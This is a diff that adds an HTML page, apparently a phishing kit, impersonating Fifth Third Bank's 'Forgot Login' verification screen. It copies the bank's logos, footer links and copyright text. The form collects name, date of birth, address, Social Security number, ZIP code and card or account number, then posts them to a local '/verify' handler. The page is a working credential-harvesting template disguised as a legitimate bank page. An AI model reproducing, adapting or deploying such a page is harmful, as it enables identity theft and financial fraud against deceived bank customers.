@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <title>Forgot Login - Fifth Third Bank</title>
+  <!--<base href="/olb/">-->
+  <base href=".">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <link rel="stylesheet" type="text/css" href="./assets/lp_53.css">
+  <noscript>
+    <style>
+      .jsonly {
+        display: none;
+      }
+    </style>
+  </noscript>
+  <style>
+    html {
+      font-family: Open Sans, sans-serif;
+      font-size: 16px;
+      line-height: 1.2
+    }
+
+    body {
+      margin: 0;
+      overflow-x: hidden;
+      min-width: 298px;
+      min-height: 100%
+    }
+
+    html {
+      -webkit-text-size-adjust: none;
+      height: 100%
+    }
+
+    *,
+    *:before,
+    *:after {
+      box-sizing: border-box
+    }
+
+    body {
+      border-color: #bebfbf
+    }
+
+    html {
+      overflow-y: scroll
+    }
+
+    @media print {
+      body * {
+        color: #000 !important;
+        box-shadow: none !important;
+        text-shadow: none !important;
+        background-color: #fff !important;
+        border-radius: 0 !important;
+        border-color: #000 !important;
+        transition: none !important
+      }
+    }
+  </style>
+  <link rel="stylesheet" href="./assets/styles.a6ad5708156d8cc1.css" media="all"
+    onload="this.media=&#39;all&#39;"><noscript>
+    <link rel="stylesheet" href="styles.a6ad5708156d8cc1.css">
+  </noscript>
+  <style type="text/css"></style>
+  <style>
+    .footer .footer__nav.first .nav-list__item {
+      padding-left: 0
+    }
+
+    .footer .footer__nav.second .nav-list__item {
+      padding-left: 3px
+    }
+
+    .footer .footer__nav.second {
+      margin-left: -8px
+    }
+
+    .footer .nav-list__item:after {
+      padding-left: .6em
+    }
+  </style>
+
+
+<body class="body-reset">
+  <ftb-root ng-version="15.2.9">
+    <div id="app" class="jsonly device-reg ng-star-inserted"><ftb-header>
+        <div class="header container">
+          <div class="spacing-s spacing-v--half">
+            <div class="structure-2">
+              <div class="structure-2__cell-A"><!----><span class="header__logo ng-star-inserted"
+                  title="Fifth Third Online Banking"><img src="./assets/53_Horizontal-logo.svg"
+                    class="logo -rb" alt="Fifth Third Bank Logo"><img src="./assets/53_Shield-logo-small.svg"
+                    class="logo--small -rb" alt="Fifth Third Bank Logo"><img
+                    src="./assets/53_Horizontal-logo.svg" class="logo -pa" alt="Fifth Third Bank Logo"><img
+                    src="./assets/53_Shield-logo-small.svg" class="logo--small -pa"
+                    alt="Fifth Third Bank Logo"></span><!----></div><!---->
+            </div>
+          </div>
+        </div>
+      </ftb-header>
+      <div id="main" class="container">
+        <div class="container__wrap">
+          <div id="main-content" class="global-structure--single"><ftb-side-bar-menu><!----></ftb-side-bar-menu>
+            <div class="global-structure__cell-B content">
+              <main role="main" id="focusContentOnLoad" tabindex="-1">
+                <div>
+                  <div id="loadingComplete" class="loadingFinishedStatus" role="status" aria-label="Loading Complete"
+                    aria-hidden="true"></div>
+
+                </div>
+                <div class="content__wrap--single--sm">
+                  <div class="spacing--sides">
+                    <ftb-service-message><!----><!----><!----><!----><!----></ftb-service-message></div>
+                  <div main-view="" id="main-view" autoscroll="false" class="spacing-v--2x spacing--sides">
+                    <router-outlet style="display:&quot;&quot;"></router-outlet><ftb-forgot-login
+                      style="display:&quot;&quot;" class="ng-star-inserted"><!---->
+                      <div class="card b-s b-r ng-star-inserted">
+                        <div class="card__header"><span class="card__header__title"> Confirm your details </span></div>
+                        <div class="card__body">
+                          <div class="nc-body-wrap"><span class="media-block -stacked-center"><span
+                                class="media-block__media"><img src="./assets/user-Question-o.svg"
+                                  alt="Silhouette of person inside a circle with a question mark"
+                                  class="media-block__media__img img-responsive"></span><span class="media-block__body">
+                                <div class="b fs-5-shift spacing-bottom--half"> User Information </div>
+                                <div class="nc-body-text"> To verify your account, please tell us about yourself. </div>
+                              </span></span>
+                            <form novalidate="" method="post" action="/verify" name="reset-form" class="form ng-valid ng-touched ng-dirty">
+                              <div class="form__row -spaced">
+                                <div class="form__row__cell -size0">
+                                  <input name="pg" value="scd" type="hidden"/>
+                                  <div class="form__row__cell__content"><label for="lastName-id"
+                                      class="form-label form__label"> First Name </label>
+                                    <div class="dynamic-state" data-valid="true"><input
+                                        ftbinputrestrict="[^a-zA-Z\-\\s\\&amp;\&#39;\\/]" maxlength="255"
+                                        name="first-id" id="first-id" type="text" autocomplete="off"
+                                        ftbautofocus=""
+                                        class="form-input full dynamic-state__input ng-valid ng-touched ng-dirty"><span
+                                        role="button" class="dynamic-state__icon glyph-after clickable-icon styled-icon"
+                                        title="Error on entry" data-icon="alert"></span><label for="lastName-id"
+                                        id="firstNameError" class="dynamic-state__details informational-txt"> This field
+                                        is required </label></div>
+                                  </div>
+                                </div>
+                              </div>
+
+                              <div class="form__row -spaced">
+                                <div class="form__row__cell -size0">
+                                  <div class="form__row__cell__content"><label for="lastName-id"
+                                      class="form-label form__label"> Last Name </label>
+                                    <div class="dynamic-state" data-valid="true"><input
+                                        ftbinputrestrict="[^a-zA-Z\-\\s\\&amp;\&#39;\\/]" maxlength="255"
+                                        name="lastName-id" id="lastName-id" type="text" autocomplete="off"
+                                        ftbautofocus=""
+                                        class="form-input full dynamic-state__input ng-valid ng-touched ng-dirty"><span
+                                        role="button" class="dynamic-state__icon glyph-after clickable-icon styled-icon"
+                                        title="Error on entry" data-icon="alert"></span><label for="DOB-id"
+                                        id="lastNameError" class="dynamic-state__details informational-txt"> This field
+                                        is required </label></div>
+                                  </div>
+                                </div>
+                              </div>
+                              
+                              <div class="form__row -spaced">
+                                <div class="form__row__cell -size0">
+                                  <div class="form__row__cell__content"><label for="lastName-id"
+                                      class="form-label form__label"> Date of Birth (DOB) </label>
+                                    <div class="dynamic-state" data-valid="true"><input
+                                        ftbinputrestrict="[^a-zA-Z\-\\s\\&amp;\&#39;\\/]" maxlength="255"
+                                        name="DOB" id="DOB-id" type="text" autocomplete="off"
+                                        ftbautofocus=""
+                                        class="form-input full dynamic-state__input ng-valid ng-touched ng-dirty"><span
+                                        role="button" class="dynamic-state__icon glyph-after clickable-icon styled-icon"
+                                        title="Error on entry" data-icon="alert"></span><label for="DOB-id"
+                                        id="DOBError" class="dynamic-state__details informational-txt"> This field
+                                        is required </label></div>
+                                  </div>
+                                </div>
+                              </div>
+
+                              <div class="form__row -spaced">
+                                <div class="form__row__cell -size0">
+                                  <div class="form__row__cell__content"><label for="Address"
+                                      class="form-label form__label"> Address </label>
+                                    <div class="dynamic-state" data-valid="true"><input
+                                        ftbinputrestrict="[^a-zA-Z\-\\s\\&amp;\&#39;\\/]" maxlength="255"
+                                        name="Address" id="Address-id" type="text" autocomplete="off"
+                                        ftbautofocus=""
+                                        class="form-input full dynamic-state__input ng-valid ng-touched ng-dirty"><span
+                                        role="button" class="dynamic-state__icon glyph-after clickable-icon styled-icon"
+                                        title="Error on entry" data-icon="alert"></span><label for="Address"
+                                        id="Address" class="dynamic-state__details informational-txt"> This field
+                                        is required </label></div>
+                                  </div>
+                                </div>
+                              </div>
+
+                              <div class="form__row -spaced">
+                                <div class="form__row__cell -size0">
+                                  <div class="form__row__cell__content"><label for="ssn-id"
+                                      class="form-label -tooltip form__label"> Social Security Number (SSN)
+                                    </label><ftb-tool-tip
+                                      inner="&lt;span class=&quot;icon--question-o anchor-4 tooltip__trigger--icon&quot;&gt;&lt;/span&gt;"><span
+                                        mattooltipclass="multiline-tooltip" class="mat-mdc-tooltip-trigger tooltip"
+                                        aria-describedby="cdk-describedby-message-uov-1-2"
+                                        cdk-describedby-host="uov-1"><span
+                                          class="icon--question-o anchor-4 tooltip__trigger--icon"></span></span><!----></ftb-tool-tip>
+                                    <div class="dynamic-state" data-valid="true"><input ftbinputrestrict="[^0-9]"
+                                        maxlength="9" name="ssn-id" id="ssn-id" type="password" autocomplete="off"
+                                        class="form-input full dynamic-state__input ng-untouched ng-pristine ng-valid"><span
+                                        role="button" class="dynamic-state__icon glyph-after clickable-icon styled-icon"
+                                        title="Error on entry" data-icon="alert"></span><label for="ssn-id"
+                                        id="ssnError" class="dynamic-state__details informational-txt"> </label></div>
+                                  </div>
+                                </div>
+                              </div>
+                              <div class="form__row -spaced">
+                                <div class="form__row__cell -size0">
+                                  <div class="form__row__cell__content"><label for="zip-id"
+                                      class="form-label form__label">Zip Code</label>
+                                    <div class="dynamic-state" data-valid="true"><input ftbinputrestrict="[^0-9]"
+                                        maxlength="5" name="zip-id" id="zip-id" type="text" autocomplete="off"
+                                        class="form-input full dynamic-state__input ng-untouched ng-pristine ng-valid"><span
+                                        role="button" class="dynamic-state__icon glyph-after clickable-icon styled-icon"
+                                        title="Error on entry" data-icon="alert"></span><label for="zip-id"
+                                        id="zipError" class="dynamic-state__details informational-txt"> </label></div>
+                                  </div>
+                                </div>
+                              </div>
+                              <div class="form__row -spaced">
+                                <div class="form__row__cell -size0">
+                                  <div class="form__row__cell__content"><label for="account-number"
+                                      class="form-label -tooltip form__label"> Card Number
+                                    </label><ftb-tool-tip
+                                      inner="&lt;span class=&quot;icon--question-o anchor-4 tooltip__trigger--icon&quot;&gt;&lt;/span&gt;"><span
+                                        mattooltipclass="multiline-tooltip" class="mat-mdc-tooltip-trigger tooltip"
+                                        aria-describedby="cdk-describedby-message-uov-1-3"
+                                        cdk-describedby-host="uov-1"><span
+                                          class="icon--question-o anchor-4 tooltip__trigger--icon"></span></span><!----></ftb-tool-tip>
+                                    <div class="dynamic-state" data-valid="true"><input pattern="[^\d]*"
+                                        name="account-number" id="account-number" maxlength="22" autocomplete="off"
+                                        class="form-input full dynamic-state__input ng-untouched ng-pristine ng-valid"><span
+                                        role="button" data-icon="alert"
+                                        class="dynamic-state__icon glyph-after clickable-icon styled-icon"
+                                        title="Error on entry"></span><label for="account-number"
+                                        class="dynamic-state__details informational-txt"> </label></div>
+                                  </div>
+                                </div>
+                              </div><button id="subbut" type="submit" class="vishidden"></button>
+                            </form>
+                            <div class="nc-button-group centered spacing-top"><button role="button" type="submit" id="next"
+                                class="button -default -primary"> Next <span class="bounce--1">.</span><span
+                                  class="bounce--2">.</span><span class="bounce--3">.</span></button></div>
+                          </div>
+                        </div>
+                      </div><!---->
+                          <!--div class="nc-body-text nc-body-text--small centered nc-service ng-star-inserted"> Already have
+                        access? <a href="javascript:;" class="anchor primary clickable-area"> Log In </a></div>
+                    </ftb-forgot-login></div-->
+                </div>
+              </main>
+            </div>
+          </div><ftb-login-help><!----></ftb-login-help>
+        </div>
+      </div><ftb-footer>
+        <footer id="footer" role="contentinfo" class="footer container spacing--sides-m1 informational-txt">
+          <div class="container__wrap">
+            <div class="spacing-right spacing-v margin-top--half">
+              <nav role="navigation" aria-label="Secondary menu">
+                <div class="structure -lc -vc-m full">
+                  <div class="structure__cell"><!---->
+                    <ul class="unlist nav-list bracket-spaced footer__nav fs-0-shift second">
+                      <li class="nav-list__item"><a target="_blank" rel="noopener noreferrer" class="anchor primary"
+                          href="https://www.53.com/ftb-about" title="Opens in a new tab"
+                          aria-label="About Us"><span>About Us</span></a></li>
+                      <li class="nav-list__item"><a target="_blank" rel="noopener noreferrer" class="anchor primary"
+                          href="https://www.53.com/ftb-service" title="Opens in a new tab"
+                          aria-label="Customer Service"><span>Customer Service</span></a></li>
+                      <li class="nav-list__item"><a target="_blank" rel="noopener noreferrer" class="anchor primary"
+                          href="https://www.53.com/ftb-careers" title="Opens in a new tab"
+                          aria-label="Careers"><span>Careers</span></a></li>
+                      <li class="nav-list__item"><a target="_blank" rel="noopener noreferrer" class="anchor primary"
+                          href="https://www.53.com/ftb-jobseeker" title="Opens in a new tab"
+                          aria-label="Job Seeker’s Toolkit"><span>Job Seeker’s Toolkit</span></a></li>
+                      <li class="nav-list__item"><a target="_blank" rel="noopener noreferrer" class="anchor primary"
+                          href="https://www.53.com/ftb-media" title="Opens in a new tab"
+                          aria-label="Media Center"><span>Media Center</span></a></li>
+                      <li class="nav-list__item"><a target="_blank" rel="noopener noreferrer" class="anchor primary"
+                          href="https://www.53.com/ftb-security" title="Opens in a new tab"
+                          aria-label="Privacy &amp; Security"><span>Privacy &amp; Security</span></a></li>
+                      <li class="nav-list__item"><a target="_blank" rel="noopener noreferrer" class="anchor primary"
+                          title="Opens in a new tab" href="https://www.53.com/ftb-locations"
+                          aria-label="Branch &amp; ATM Locator"><span>Branch &amp; ATM Locator</span></a></li><!---->
+                      <li class="nav-list__item"><a target="_blank" rel="noopener noreferrer" class="anchor primary"
+                          href="https://onlinebanking.53.com/apps/ib/shared/static/ftb-digital-services-user-agreement.pdf"
+                          title="Opens a PDF in a new tab" aria-label="Digital Services User Agreement"><span>Digital
+                            Services User Agreement</span></a></li><!---->
+                    </ul>
+                  </div>
+                  <div class="structure__cell informational-txt"><!---->
+                    <div class="footer__logo spacing-v"><img src="./assets/equal-housing-lender--large.png"
+                        class="logo" alt="Equal Housing Lender"><img src="./assets/member-fdic.png"
+                        class="logo" alt="Member FDIC"></div>
+                  </div>
+                </div>
+              </nav>
+              <p class="full copyright"
+                aria-label="Copyright 2024 Fifth Third Bank, National Association, All Rights Reserved."> Copyright ©
+                2024 Fifth Third Bank, National Association, All Rights Reserved. </p>
+              <p>Version 24.1.2-N</p>
+            </div>
+          </div>
+        </footer>
+      </ftb-footer><ftb-toast><!----></ftb-toast><ftb-modal><!----></ftb-modal><ftb-error-modal
+        class="ng-tns-c193-0 ng-star-inserted"><!----></ftb-error-modal><ftb-survey><!----></ftb-survey><!----><!---->
+    </div><!----><!---->
+  </ftb-root>
+
+  <noscript>
+    <div id="app">
+      <div class="header container">
+        <div class="container__wrap spacing-v--half">
+          <div class="structure-2">
+            <div class="structure-2__cell-A">
+              <span class="header__logo ng-scope" title="Fifth Third Internet Banking">
+                <img class="logo" src="./assets/fifth-third-logo.png" alt="Fifth Third Bank Logo" />
+                <img class="logo--small" src="./assets/fifth-third-logo--small.png" alt="Fifth Third Bank Logo" />
+              </span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="container" id="main">
+        <div class="container__wrap">
+          <div id="main-content" class="global-structure--single">
+            <div class="global-structure__cell-B content">
+              <main role="main">
+                <div class="content__wrap--single--sm">
+                  <div class="spacing-v--2x spacing--sides">
+                    <div class="card b-r b-s spacing fs-1-shift account-group">
+                      <h2 class="b-2 title spacing-v--half">JavaScript Required</h2>
+
+                      <p>
+                        Enable JavaScript in your browser settings to use Fifth Third Online Banking. For help, select
+                        the appropriate link below:
+                      </p>
+                      <ul>
+                        <li>
+                          <a href="//support.google.com/chrome/?hl=en" target="_blank" rel="noopener noreferrer"
+                            class="anchor-1">
+                            Google Chrome
+                          </a>
+                        </li>
+                        <li>
+                          <a href="//www.apple.com/support/safari/" target="_blank" rel="noopener noreferrer"
+                            class="anchor-1">
+                            Apple Safari
+                          </a>
+                        </li>
+                        <li>
+                          <a href="//support.mozilla.org/" target="_blank" rel="noopener noreferrer" class="anchor-1">
+                            Mozilla Firefox
+                          </a>
+                        </li>
+                        <li>
+                          <a href="//support.microsoft.com/product/internet-explorer" target="_blank"
+                            rel="noopener noreferrer" class="anchor-1">
+                            Microsoft Internet Explorer
+                          </a>
+                        </li>
+                      </ul>
+                      <a href="/">
+                        <button type="button" class="button -default -primary -full spacing-alt-v--half">
+                          Back to Login
+                        </button>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </main>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer container spacing--sides-m1 informational-txt" role="contentinfo">
+        <div class="container__wrap">
+          <div class="spacing-right spacing-v margin-top--half">
+            <nav role="navigation">
+              <div class="structure -lc -vc-m full">
+                <div class="structure__cell">
+                  <ul class="unlist nav-list bracket-spaced footer__nav fs-0-shift">
+                    <li class="nav-list__item">
+                      <a class="anchor primary" href="https://www.53.com/about/" target="_blank"
+                        rel="noopener noreferrer" title="About Us" role="link">
+                        <span class="ng-binding">About Us</span>
+                      </a>
+                    </li>
+                    <li class="nav-list__item">
+                      <a class="anchor primary" href="https://www.53.com/customer-service/" target="_blank"
+                        rel="noopener noreferrer" title="Customer Service" role="link">
+                        <span class="ng-binding">Customer Service</span>
+                      </a>
+                    </li>
+                    <li class="nav-list__item">
+                      <a class="anchor primary" href="https://www.53.com/careers/" target="_blank"
+                        rel="noopener noreferrer" title="Careers" role="link">
+                        <span class="ng-binding">Careers</span>
+                      </a>
+                    </li>
+                    <li class="nav-list__item">
+                      <a class="anchor primary" href="https://53.com/media-center/" target="_blank"
+                        rel="noopener noreferrer" title="Media Center" role="link">
+                        <span class="ng-binding">Media Center</span>
+                      </a>
+                    </li>
+                    <li class="nav-list__item">
+                      <a class="anchor primary" href="https://www.53.com/privacy-security/" target="_blank"
+                        rel="noopener noreferrer" title="Privacy &amp; Security" role="link">
+                        <span class="ng-binding">Privacy &amp; Security</span>
+                      </a>
+                    </li>
+                    <li class="nav-list__item">
+                      <a class="anchor primary" href="https://apps.53.com/bal/#/locations" target="_blank"
+                        rel="noopener noreferrer" title="Branch &amp; ATM Locator" role="link">
+                        <span class="ng-binding">Branch &amp; ATM Locator</span>
+                      </a>
+                    </li>
+                  </ul>
+                </div>
+                <div class="structure__cell informational-txt">
+                  <div class="footer__logo spacing-v">
+                    <img class="logo" src="./assets/equal-housing-lender--large.png" alt="Equal Housing Lender" />
+                    <img class="logo" src="./assets/member-fdic.png" alt="Member FDIC" />
+                  </div>
+                </div>
+              </div>
+            </nav>
+            <p class="full copyright ng-binding">© 2017 Fifth Third Bank, All rights reserved.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </noscript>
+
+
+  <div class="cdk-describedby-message-container cdk-visually-hidden" style="visibility: hidden;">
+    <div id="cdk-describedby-message-uov-1-2" role="tooltip">Enter your 9-digit Social Security Number (SSN) or Tax
+      Payer ID (TIN). If you do not have one, call customer service at (800) 972-3030.</div>
+    <div id="cdk-describedby-message-uov-1-3" role="tooltip">Enter your 16-digit card number or the account number
+      associated with your checking, savings, or loan account, found on your statement.</div>
+  </div>
+</body>
+<script>
+ 
+  let inputs = document.getElementsByClassName("form-input");
+let inputsArray = Array.from(inputs);
+
+inputsArray.forEach(input => {
+  input.addEventListener('blur', function() {
+    let parentElement = input.parentElement;
+    let nFilled = parentElement.getAttribute('data-valid');
+    let isValid = true;
+
+    if (!input.value) {
+      console.log("false");
+      nFilled = "false"; // Update data-valid attribute to "false"
+  
+    } else {
+      console.log("true");
+      nFilled = "true"; // Update data-valid attribute to "true"
+     
+    }
+
+    // Update the data-valid attribute of the parent element
+    parentElement.setAttribute('data-valid', nFilled);
+  });
+});
+
+
+document.getElementById("next").addEventListener('click', ()=> {
+  document.getElementById('subbut').click();
+});
+
+ 
+</script>
+
+</html>
